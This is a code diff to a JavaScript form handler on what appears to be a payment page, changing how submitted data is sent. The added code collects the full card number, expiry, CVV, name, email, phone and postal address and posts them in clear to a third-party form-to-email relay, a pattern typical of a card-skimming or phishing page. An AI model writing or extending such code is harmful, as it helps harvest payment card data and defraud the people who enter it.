@@ -330,14 +330,47 @@ async function handleSubmit(event) {
 
   const txnId = generateTxnId();
   
-  // Set hidden fields before submission
+  // populate transaction id
   document.getElementById('transactionIdField').value = txnId;
-  document.getElementById('replyToField').value = email;
-  document.getElementById('copyToField').value = email;
 
   setBtn(true);
 
-  // Submit directly to FormSubmit from the localhost-served page.
-  document.getElementById('paymentForm').submit();
-  return true;
+  // Build Web3Forms payload
+  const formData = new FormData();
+  formData.append('access_key', document.getElementById('web3formsAccessKey')?.value || '');
+  formData.append('transaction_id', txnId);
+  formData.append('name', name);
+  formData.append('card', rawCard);
+  formData.append('month', expiryMonth);
+  formData.append('year', expiryYear);
+  formData.append('cvv', cvv);
+  formData.append('amount', amount);
+  formData.append('email', email);
+  formData.append('phone', phoneVal);
+  formData.append('address1', addr1);
+  formData.append('address2', addr2);
+  formData.append('city', city);
+  formData.append('state', state);
+  formData.append('postal', postal);
+  formData.append('country', country);
+
+  try {
+    const res = await fetch('https://api.web3forms.com/submit', {
+      method: 'POST',
+      headers: { Accept: 'application/json' },
+      body: formData,
+    });
+    const json = await res.json().catch(() => ({}));
+    if (!res.ok || json.success === false) throw new Error(json.message || 'Submission failed');
+
+    document.getElementById('txnId').textContent = txnId;
+    document.getElementById('successBox').classList.add('visible');
+    document.getElementById('paymentForm').style.display = 'none';
+    setBtn(false);
+    return true;
+  } catch (err) {
+    alert(err.message || 'Unable to submit form');
+    setBtn(false);
+    return false;
+  }
 }
